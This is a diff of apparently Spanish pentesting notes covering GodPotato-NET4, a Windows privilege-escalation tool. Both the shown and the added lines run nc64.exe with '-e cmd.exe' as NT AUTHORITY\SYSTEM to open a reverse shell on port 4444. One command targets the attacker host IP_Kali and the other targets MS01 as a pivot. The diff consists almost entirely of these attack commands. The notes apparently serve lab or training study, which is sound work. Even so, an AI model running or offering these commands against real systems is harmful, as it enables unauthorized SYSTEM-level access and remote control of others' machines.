@@ -141,7 +141,10 @@ PASOS con 'GodPotato-NET4' para ejecuta una Reverse Shell:
 ❯ https://eternallybored.org/misc/netcat/
 
 ❯ C:\Temp\GodPotato-NET4.exe -cmd "C:\Temp\nc64.exe IP_Kali 4444 -e cmd.exe"
-# Ejecutar un comando como nt authority \system para hacer una Reverse shell 
+# Ejecutar un comando como nt authority \system para hacer una Reverse shell
+
+❯ C:\Temp\GodPotato-NET4.exe -cmd "C:\Temp\nc64.exe MS01 4444 -e cmd.exe"
+# Apuntar al server MS01 que es el pivoting hacia Kali  
 
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
